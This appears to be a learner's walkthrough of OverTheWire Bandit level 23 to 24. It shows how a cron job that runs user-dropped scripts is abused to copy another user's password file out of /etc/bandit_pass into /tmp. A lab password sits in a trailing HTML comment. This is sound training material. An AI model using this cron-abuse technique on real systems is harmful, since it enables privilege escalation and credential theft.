Let's delve into the next challenge level:

![untitled](ScreenShots/Level%2023%20->%2024.jpg)

Similar to our previous encounter, the approach might necessitate some adjustment.

---
Now, let's initiate our examination by navigating to the designated directory:
```bash
cd /etc/cron.d/
ls
```
Just as before, our focal point remains on `cronjob_bandit24`. Let's scrutinize its contents:
```bash
cat cronjob_bandit24
```
This command yields the following output:
```bash
@reboot bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
```
Proceeding with our methodical approach, let's inspect the `cronjob_bandit24.sh` script:
```sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```
The script indicates that any file within `/var/spool/$myname/foo` will be executed and subsequently removed.  
Our objective now shifts to crafting a script to retrieve the password from `/etc/bandit_pass/`.  
Our next step involves creating a `.sh` file with the following content:
```sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit23/password.txt
```
Ensure the script is executable by granting it the necessary permissions. Execute the following commands:
```bash
touch /tmp/bandit23/password.txt
chmod 777 /tmp/bandit23/password.txt
```
Afterward, patiently await approximately a minute for the files in the directory to execute cyclically.  
Once the wait is over, unveil the password for the subsequent level:
```bash
cat /tmp/bandit23/password.txt
```
With the password in hand, we are ready to advance.

To progress, we employ SSH:
```bash
Command: `ssh -p 2220 bandit24@bandit.labs.overthewire.org`
#Password: Password stored previously
```
<!-- Password: `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar` -->